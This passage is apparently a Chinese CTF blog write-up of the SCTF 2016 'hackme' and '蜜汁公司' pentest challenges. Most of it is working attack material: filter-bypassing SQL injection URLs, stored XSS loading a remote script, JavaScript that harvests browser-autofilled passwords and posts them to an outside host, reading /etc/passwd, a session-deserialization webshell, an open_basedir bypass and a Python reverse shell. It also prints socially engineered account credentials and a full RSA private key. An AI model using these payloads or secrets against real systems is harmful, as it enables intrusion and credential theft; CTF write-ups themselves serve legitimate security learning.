+<p>打开站发现并不能没有找到备忘录在哪<br/>只能找到<br/><a href="http://hackme.sctf.xctf.org.cn/login.php" rel="external" target="_blank">http://hackme.sctf.xctf.org.cn/login.php</a><br/><a href="http://hackme.sctf.xctf.org.cn/index.php?id=1" rel="external" target="_blank">http://hackme.sctf.xctf.org.cn/index.php?id=1</a><br/>这两个页面。<br/>测试发现存在注入<br/><strong><a href="http://hackme.sctf.xctf.org.cn/index.php?id=-1||1#" rel="external" target="_blank">http://hackme.sctf.xctf.org.cn/index.php?id=-1||1#</a></strong><br/>发现对空格和很多敏感函数有过滤，尝试用/<em>!00000xxx</em>/这样的方式绕过，成功<br/><strong><a href="http://hackme.sctf.xctf.org.cn/index.php?id=1/*!00000union*//*!00000select*/version()%23" rel="external" target="_blank">http://hackme.sctf.xctf.org.cn/index.php?id=1/*!00000union*//*!00000select*/version()%23</a></strong></p>
+<p>先看看数据库内容</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">5.5</span>.<span class="number">42</span>-log</div><div class="line">user hackme@localhost</div><div class="line">库名 hackme</div><div class="line">库中有两个表</div><div class="line"><span class="selector-tag">article</span></div><div class="line">两个列</div><div class="line">id  <span class="attribute">content</span></div><div class="line"></div><div class="line">beiwanglu</div><div class="line"><span class="number">3</span>个列</div><div class="line">id <span class="selector-tag">time</span> event</div></pre></td></tr></table></figure>
+<p>看到有个beiwanglu的表</p>
+<p><strong><a href="http://hackme.sctf.xctf.org.cn/index.php?id=1/*!00000union*//*!00000select*/event/*!00000from*/beiwanglu%23" rel="external" target="_blank">http://hackme.sctf.xctf.org.cn/index.php?id=1/*!00000union*//*!00000select*/event/*!00000from*/beiwanglu%23</a></strong><br/>进去的时候看到是备忘录内容，想起一个hint是说管理员会看自己的备忘录，那么插入一个js看看</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://hackme.sctf.xctf.org.cn/index.php?id=<span class="number">1</span>;/*!<span class="number">00000</span><span class="keyword">insert</span>*//*!<span class="number">00000</span>into*/beiwanglu(id,time,event)/*!<span class="number">00000</span>values*/(<span class="number">77</span>,<span class="number">84</span>,<span class="meta">%27</span><span class="meta">%3Cscript</span>/src=<span class="meta">%22http</span>://xxx/<span class="number">1</span>.js<span class="meta">%22</span><span class="meta">%3E</span><span class="meta">%3C</span>/script<span class="meta">%3E</span><span class="meta">%27</span>)<span class="meta">%23</span></div></pre></td></tr></table></figure>
+<p>开始×回来了phpsession，发现无效，于是尝试能不能读文件<br/><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>hackme.sctf.xctf.org.cn<span class="regexp">/index.php?id=1/</span>*!<span class="number">00000</span>union*<span class="regexp">//</span>*!<span class="number">00000</span>select*<span class="regexp">/load_file('/</span>etc<span class="regexp">/passwd')%23</span></div></pre></td></tr></table></figure></p>
+<p>发现什么都能读于是翻了翻php和nginx的配置，还翻了翻lnmp的log，没什么收获<br/>尝试能不能写一个webshell进去，发现权限不够，只能写在/tmp下。</p>
+<p>这时候看到提示说<strong>浏览器的记住密码</strong><br/>想到一种可能，构造一个表单，浏览器会自动填充，然后获取内容post回来，尝试一下。<br/><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">var form1 = document.createElement(<span class="string">"form"</span>)<span class="comment">;  </span></div><div class="line">form1.id = <span class="string">"lg-form"</span><span class="comment">;  </span></div><div class="line">form1.name = <span class="string">"lg-form"</span><span class="comment">;  </span></div><div class="line">   </div><div class="line">document.<span class="keyword">body.appendChild(form1); </span> </div><div class="line">   </div><div class="line">var input = document.createElement(<span class="string">"input"</span>)<span class="comment">;  </span></div><div class="line"> </div><div class="line">input.type = <span class="string">"text"</span><span class="comment">;  </span></div><div class="line">input.name = <span class="string">"username"</span><span class="comment">; </span></div><div class="line">input.id = <span class="string">"username"</span><span class="comment">; </span></div><div class="line">input.placeholder = <span class="string">"username"</span><span class="comment">;</span></div><div class="line"></div><div class="line">var input2 = document.createElement(<span class="string">"input"</span>)<span class="comment">;  </span></div><div class="line"> </div><div class="line">input2.type = <span class="string">"password"</span><span class="comment">;  </span></div><div class="line">input2.name = <span class="string">"password"</span><span class="comment">; </span></div><div class="line">input2.id = <span class="string">"password"</span><span class="comment">; </span></div><div class="line">input2.placeholder = <span class="string">"password"</span><span class="comment">;   </span></div><div class="line"></div><div class="line">var <span class="keyword">button1 </span>= document.createElement(<span class="string">"button"</span>)<span class="comment">;  </span></div><div class="line">   </div><div class="line"><span class="keyword">button1.type </span>= <span class="string">"submit"</span><span class="comment">; </span></div><div class="line"><span class="keyword">button1.id </span>= <span class="string">"login"</span><span class="comment">; </span></div><div class="line">  </div><div class="line">form1.appendChild(input)<span class="comment">;</span></div><div class="line">form1.appendChild(input2)<span class="comment">;</span></div><div class="line">form1.appendChild(<span class="keyword">button1); </span> </div><div class="line"> </div><div class="line">form1.method = <span class="string">"POST"</span><span class="comment">;  </span></div><div class="line">form1.action = <span class="string">""</span><span class="comment">;  </span></div><div class="line"></div><div class="line">user = document.getElementById(<span class="string">'username'</span>).value<span class="comment">;</span></div><div class="line">pass = document.getElementById(<span class="string">'password'</span>).value<span class="comment">;</span></div><div class="line">var xml = new XMLHttpRequest()<span class="comment">; xml.open('POST', 'http://xss.xxx.cc', true); xml.setRequestHeader("Content-type","application/x-www-form-urlencoded"); </span></div><div class="line">setTimeout(xml.send(<span class="string">'username='</span>+user+<span class="string">'&amp;password='</span>+pass),<span class="number">2000</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>后面的settimeout是因为第一次测试的时候发现填充是需要时间的，所以需要延时</p>
+<p>get username&amp;password<br/><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">username</span></div><div class="line">admin</div><div class="line"></div><div class="line">password</div><div class="line">nizhendeyongyuancaibudaomimade</div></pre></td></tr></table></figure></p>
+<p>登录进去后发现是个下载器，然后有任意文件下载漏洞，可以构造<code>....//index.php</code>绕过过滤（其实也就是因为这个才发现之前会报错的mysql写入其实是写入了的），阅读源码发现一个比较重要的文件是session.php<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSessionHandler</span></span></div><div class="line">{</div><div class="line">    <span class="keyword">private</span> $savePath;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($savePath, $sessionName)</span></span></div><div class="line">    {</div><div class="line">        <span class="keyword">$this</span>-&gt;savePath = $savePath;</div><div class="line">        <span class="keyword">if</span> (!is_dir(<span class="keyword">$this</span>-&gt;savePath)) {</div><div class="line">            mkdir(<span class="keyword">$this</span>-&gt;savePath, <span class="number">0777</span>);</div><div class="line">        }</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    }</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span></span></div><div class="line">    {</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    }</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span></div><div class="line">    {</div><div class="line">        <span class="keyword">return</span> (string)@file_get_contents(<span class="string">"$this-&gt;savePath/sess_$id"</span>);</div><div class="line">    }</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($id, $data)</span></span></div><div class="line">    {</div><div class="line">        <span class="keyword">return</span> file_put_contents(<span class="string">"$this-&gt;savePath/sess_$id"</span>, $data) === <span class="keyword">false</span> ? <span class="keyword">false</span> : <span class="keyword">true</span>;</div><div class="line">    }</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destroy</span><span class="params">($id)</span></span></div><div class="line">    {</div><div class="line">        $file = <span class="string">"$this-&gt;savePath/sess_$id"</span>;</div><div class="line">        <span class="keyword">if</span> (file_exists($file)) {</div><div class="line">            unlink($file);</div><div class="line">        }</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    }</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gc</span><span class="params">($maxlifetime)</span></span></div><div class="line">    {</div><div class="line">        <span class="keyword">foreach</span> (glob(<span class="string">"$this-&gt;savePath/sess_*"</span>) <span class="keyword">as</span> $file) {</div><div class="line">            <span class="keyword">if</span> (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {</div><div class="line">                unlink($file);</div><div class="line">            }</div><div class="line">        }</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    }</div><div class="line">}</div><div class="line"></div><div class="line">$handler = <span class="keyword">new</span> FileSessionHandler();</div><div class="line">session_set_save_handler(</div><div class="line">    <span class="keyword">array</span>($handler, <span class="string">'open'</span>),</div><div class="line">    <span class="keyword">array</span>($handler, <span class="string">'close'</span>),</div><div class="line">    <span class="keyword">array</span>($handler, <span class="string">'read'</span>),</div><div class="line">    <span class="keyword">array</span>($handler, <span class="string">'write'</span>),</div><div class="line">    <span class="keyword">array</span>($handler, <span class="string">'destroy'</span>),</div><div class="line">    <span class="keyword">array</span>($handler, <span class="string">'gc'</span>)</div><div class="line">);</div><div class="line"></div><div class="line">register_shutdown_function(<span class="string">'session_write_close'</span>);</div><div class="line">session_start();</div></pre></td></tr></table></figure></p>
+<p>还有个init.php<br/><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</div><div class="line"></div><div class="line"><span class="regexp">//</span>error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(@<span class="variable">$_COOKIE</span>[<span class="string">'admin'</span>] !==<span class="string">'f34c2e6132748fed3ac48959c10fddcb637ca8fb'</span>) <span class="keyword">exit</span>(<span class="string">'error!'</span>);</div><div class="line"></div><div class="line">spl_autoload_register();</div><div class="line"></div><div class="line">include <span class="string">'session.php'</span>;</div><div class="line"></div><div class="line"><span class="keyword">function</span> download(<span class="variable">$filename</span>){</div><div class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>)){</div><div class="line">        <span class="keyword">exit</span>(<span class="string">'文件找不到!'</span>);</div><div class="line">    }<span class="keyword">else</span>{</div><div class="line">        header(<span class="string">"Content-type: application/octet-stream"</span>);</div><div class="line">        header(<span class="string">"Accept-Ranges: bytes"</span>);</div><div class="line">        header(<span class="string">"Content-Disposition: attachment; filename={$filename}"</span>);</div><div class="line">        header(<span class="string">"Accept-Length:"</span>.filesize(<span class="variable">$filename</span>));</div><div class="line">        readfile(<span class="variable">$filename</span>);</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure></p>
+<p>找到一篇文章是<br/><a href="http://www.freebuf.com/vuls/89754.html" rel="external" target="_blank">http://www.freebuf.com/vuls/89754.html</a></p>
+<p>尝试了发现环境不太相似，后来想起来三个白帽曾经见过一个<br/><a href="http://drops.wooyun.org/tips/10564" rel="external" target="_blank">http://drops.wooyun.org/tips/10564</a><br/><strong>spl_autoload_register函数</strong><br/>如果不指定处理用的函数，就会自动包含“类名.php”或“类名.inc”的文件，并加载其中的“类名”类。</p>
+<p><del>按照这样的方法反序列化session发现只能包含当前目录下，怎么都包含不到/tmp/…想了很久也没想出来，放弃….</del></p>
+<p>赛后看到了大神的wp，才知道这里其实是忽略了一个很重要的东西<br/><a href="http://www.firesun.me/sctf2016-web-hackme-writeup/" rel="external" target="_blank">http://www.firesun.me/sctf2016-web-hackme-writeup/</a></p>
+<p>在php.ini中有个很重要的设置：<br/><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">include_path</span>= <span class="string">".:/tmp"</span></div></pre></td></tr></table></figure></p>
+<p>在本机环境下这里并没有tmp目录（忘记看题目的了。。。）<br/>这样/tmp也会被<strong>sql_autpload_register函数</strong>搜索（错过了getshell的机会）</p>
+<p>我们可以本地测试一下这个：</p>
+<p>首先在session.php下写一个<code>$_SESSION['a']=new test()</code><br/><img alt="" src="/img/sctf/hcakme1.png"/><br/>然后在/tmp下写一个test.php<br/><code>&lt;?php echo 233?&gt;</code></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root<span class="variable">@VM-181-46-ubuntu:</span>/home/wwwroot/default/test# php init.php </div><div class="line"><span class="number">233</span>PHP Fatal <span class="attribute">error</span>:  spl_autoload(): Class test could not be loaded in /home/wwwroot/default/test/session.php on line <span class="number">63</span></div></pre></td></tr></table></figure>
+<p>虽然报错了，但是确实执行了，那么剩下就是session反序列化得问题了</p>
+<p>我们在/tmp目录下构造一个webshell test.php<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>])<span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
+<p>然后生成一个合理的session文件，类似于sess_26位随机数,向sess下写入我们想要的内容<br/><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">http</span>://hackme.sctf.xctf.org.cn/index.php?id=<span class="number">0</span><span class="comment">/*!00000union*/</span><span class="comment">/*!00000select*/</span><span class="string">'a|O:4:"test":0:{}'</span><span class="comment">/*123*/</span><span class="keyword">into</span><span class="comment">/*123*/</span>outfile<span class="string">'/tmp/sess_xxxxxxxxxxxxxxxxxxx'</span></div></pre></td></tr></table></figure></p>
+<p>带着上面的session去访问main.php</p>
+<p>getshell</p>
+<p>这里firesun大神用了<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></div><div class="line">file_put_contents(<span class="string">"/home/wwwroot/hackme/05d6a8025a7d0c0eee5f6d12a0a94cc9/shell.php"</span>,<span class="string">'&lt;?php eval($_POST[1]);?&gt;</span>');</div></pre></td></tr></table></figure></p>
+<p>像网站目录中写了一个webshell，想想应该要比我的方法更好，方便后续的操作</p>
+<p>进去了发现由于.user.ini设置了<br/><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open_baseair = <span class="regexp">/home/</span>wwwroot<span class="regexp">/hackme:/</span>tmp<span class="regexp">/:/</span>proc<span class="regexp">/</span></div></pre></td></tr></table></figure></p>
+<p>所以要想办法绕过了<br/>我只知道两种，第一种是firesun大神使用的<br/>通过在子目录设置<code>.user.ini</code>来覆盖设置</p>
+<p>由于main.php、session.php、session.php在子目录05d6a8025a7d0c0eee5f6d12a0a94cc9/下，在05d6a8025a7d0c0eee5f6d12a0a94cc9/下写入一个<code>.user.ini</code><br/><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">open_basedir</span>=/</div></pre></td></tr></table></figure></p>
+<p>然后等5分钟生效，然后shell不再受open_basedir限制，找找发现flag在wwwroot/flag_is_here下</p>
+<p>但是这种方式不是tomato大神的本意，第二种方式是服务器配置不当导致<br/><a href="http://wooyun.org/bugs/wooyun-2010-0145879" rel="external" target="_blank">http://wooyun.org/bugs/wooyun-2010-0145879</a><br/>在php.ini中可以看到被禁用的函数<br/><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">disable_functions = passthru,<span class="keyword">exec</span>,<span class="keyword">system</span>,<span class="keyword">chroot</span>,scandir,chgrp,<span class="keyword">chown</span>,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,<span class="keyword">readlink</span>,<span class="keyword">symlink</span>,popepassthru,stream_socket_server</div></pre></td></tr></table></figure></p>
+<p>其中少了一个很重要的是<strong>pcntl_exe</strong></p>
+<p>说明我们可以执行与php无关的二进制文件，条件好甚至可以反弹shell<br/>写一个py在/tmp目录下<br/><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> socket,subprocess,<span class="built_in">os</span>  </div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  </div><div class="line">s.connect((<span class="string">"IP地址"</span>,端口))  </div><div class="line"><span class="built_in">os</span>.dup2(s.fileno(),<span class="number">0</span>)  </div><div class="line"><span class="built_in">os</span>.dup2(s.fileno(),<span class="number">1</span>)  </div><div class="line"><span class="built_in">os</span>.dup2(s.fileno(),<span class="number">2</span>)  </div><div class="line">p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>]);</div></pre></td></tr></table></figure></p>
+<p>然后用pcntl_exec启动<br/><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pcntl_exec(<span class="string">"/usr/bin/python"</span>,array(<span class="string">"/tmp/1.py"</span>))<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>get shell</p>
+<p>当然可以想wooyun文章上说那样输入，原理相同</p>
+<h2 id="蜜汁公司"><a class="headerlink" href="#蜜汁公司" title="蜜汁公司"></a>蜜汁公司</h2><p><a href="http://mizhicrop.sctf.xctf.org.cn" rel="external" target="_blank">http://mizhicrop.sctf.xctf.org.cn</a><br/>1.提示都在QQ空间里面<br/>2.社工<br/>3.找到测试站点，然后拿下蜜汁公司</p>
+<p><a href="http://user.qzone.qq.com/2137162120" rel="external" target="_blank">http://user.qzone.qq.com/2137162120</a><br/>28岁 6.1生日 Bl4ck_Roll<br/>肖咪咪 (Bl4ck_Roll)<br/>蜜汁公司 - CTO</p>
+<p>得到印象笔记<br/>帐号：2137162120@qq.com<br/>密码：xiaomimi0601</p>
+<p>加了好友社工到了验证码√</p>
+<p>发现重要的信息<br/><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">服务器管理</div><div class="line"><span class="number">114.215</span><span class="number">.103</span><span class="number">.83</span>  用户名 bl4ckr0ll  </div><div class="line">最近这个账号有点问题，还是把执行权限给去掉</div><div class="line"></div><div class="line">id_rsa</div><div class="line">-----BEGIN RSA PRIVATE KEY-----</div><div class="line">MIIEowIBAAKCAQEAyYZoMBDUrjIYXLPbJsqNVDENbyWVSeKfyIc0bQ6LPBWYagKI</div><div class="line">uPGQ3Lqq4vyvdePutqT7zhHEkj50RAOzTt2m595ldxx3YXYZhryF/XwDcKUhYv9O</div><div class="line">Rqzt0j3MM+ekfrZI7cryMvUJcoYdwnaD+O7ZOdmmE7gMkcHzlN+LDDND99JbzbrI</div><div class="line">C2kvHqWskE/zfMn2heI5MFPf0zLZgm932J6UI5ms0CdgVQCIQX3LzYfhC+mdbe3p</div><div class="line">X9ptcSeCowjC5RdqtjiML6DWvmD2VcavJRfqDi26pKmhy8xnOoeDJu87WpFXnQbx</div><div class="line">GJpJ81QsFJPRyXdT5NZojhR7Jz4lnnwHz9kZZQIDAQABAoIBAEkW10i/gfNftdhB</div><div class="line">XvVVtyZW2BF8pwVyDRN0ff4jrTnwdyPToXS6IBj+FqZWkOiH73cMpUraxNlpj09v</div><div class="line">rCOpXjRwQ4qMp3uQkrd8Pnht9u1u5on6IJCffW2n/hzBIbbXM+ISnf7/QhroK3jw</div><div class="line"><span class="number">9</span>PJe5igGGSbDtMNUfZx76vlUyozheCvBO98FvS5maHx5Si4POeGU9JyU4gA4SFvX</div><div class="line"><span class="number">0</span>JIcI7DjLCpL23kuG5hXBDx5IEPXAB7HTqXcd+CF+/qIsPbeRdy5Ys03pNJ1BGqt</div><div class="line">/<span class="number">9</span>vlryUYs0PIE4vAx6iBZhwffEbpcLsSlTB0HTbyFGKs2IJqdu5tP3aC81yhN4Kw</div><div class="line">WQMZAK0CgYEA9W1i80/wkSuGR9gnP1NEuLFpAcqDEXSpVJbi6xdOeFqq9r54zt9O</div><div class="line">ml41FAtV15/<span class="number">3</span>zkrUh/P5RvtR1Jz23kQF4IKHn76KTYUAt/AcY4P4Bg4qI6QiUigO</div><div class="line">r7YfAslGjGJNwLMokIt3Dizrq19QCc+<span class="number">9</span>gaRVI20HV+gd4FSBywdmOKsCgYEA0jTb</div><div class="line"><span class="number">4</span>RgJHAwXuec3jIuO9P4G9m+iA3dGCW/ZkySLCQBLHr2pjTzEf+<span class="number">2</span>/CNJTVKnfASrs</div><div class="line">sJpicKr/n/O7SJJi0M/vAkcJLi5yH7R3nX7sRJn9BBxxC5gxGFFgtTXS5hwOj2wy</div><div class="line">cpHXS6ObKa+<span class="number">58</span>MKJ+cqA1yUjvDYa5Q6c6m2iFi8CgYANoZ21VeNOrNQweVj0s3NF</div><div class="line">rtTePJk7BvfAswC3ffvlw2NrgPjExLJg8IqSKm8CIuholM9pHavivWK2JGGxxqVs</div><div class="line"><span class="number">6</span>tMNlE+qLpDzpmptPI8yBudgQ2WEmqT2LW9bgEJi2bLn2QuPu69JIkWUpx6S7O7h</div><div class="line">nHb+GLgnscS3CPqMhESxMQKBgQCnRytHOHJfYHwtE4QQEysjaVevGu0J5wvUDK9P</div><div class="line">OgBunE4rW3EnFRmmWFLyuTVZJYlyi28ppuH5mQqthi8etGdwllg0LsVue8WT13Bs</div><div class="line"><span class="number">5</span>AkvGn/PmraXLHi9Sl00N23qcp9foRGQPODgr4SVquLEZnuYTX80Nrj2WPQUHgnf</div><div class="line">QHmBPwKBgEpoS+y1s3P8YIW50dpCA4PNQgBNwWpWXiHgMiftGtlq3+t7VUZcJqq+</div><div class="line">ak3/isqwkfTRqWZwrWD26RIgUAyp16ufoRkOlASac5jVPc5BsTg/bwhpbVha8Lyi</div><div class="line">Vj861IZS+UMaoS7KHggTrxxZ6QzwRI1bjYWkyNMhpTweH4/O8Ydf</div><div class="line">-----END RSA PRIVATE KEY-----</div></pre></td></tr></table></figure></p>
+<p>但是一连上就会被踢出，所以后来没做了，但是比赛要结束的时候得到一个cve编号<br/><strong>cve-2016-3115</strong></p>
+<p>找到一篇文章</p>
+<p><a href="http://blog.csdn.net/qq_27446553/article/details/50906562" rel="external" target="_blank">http://blog.csdn.net/qq_27446553/article/details/50906562</a></p>
+<p>得到一个poc，尝试发现成功连上服务器，可惜的是只有读文件和写文件的功能，翻了10分钟也没找到什么有用的信息….好吧Orz</p>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2016/05/09/sctf2016/">sctf2016_writeup</a></p>
+<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
+<p><span>发布时间:</span>2016-05-09, 15:56:54</p>
+<p><span>最后更新:</span>2016-05-10, 13:31:02</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2016/05/09/sctf2016/" title="sctf2016_writeup">http://lorexxar.cn/2016/05/09/sctf2016/</a>
+<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2016/05/09/sctf2016/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<div class="article-nav-title" id="article-nav-newer">
+<a href="/2016/05/10/asis-bcloud/">
+                    Asis2016_Binary Cloud
+                </a>
+</div>
+<div class="article-nav-title" id="article-nav-older">
+<a href="/2016/05/05/dockerfile/">
+                    dockerfile  (・ω・)ノ
+                </a>
+</div>
+</nav>
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#神秘代码"><span class="toc-number">1.1.</span> <span class="toc-text">神秘代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PENTEST"><span class="toc-number">2.</span> <span class="toc-text">PENTEST</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#homework"><span class="toc-number">2.1.</span> <span class="toc-text">homework</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hackme"><span class="toc-number">2.2.</span> <span class="toc-text">hackme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#蜜汁公司"><span class="toc-number">2.3.</span> <span class="toc-text">蜜汁公司</span></a></li></ol></li></ol>
+</div>
+<style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
+<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div></div></div></div></body></html>
+
+<script>
+            window._bd_share_config={
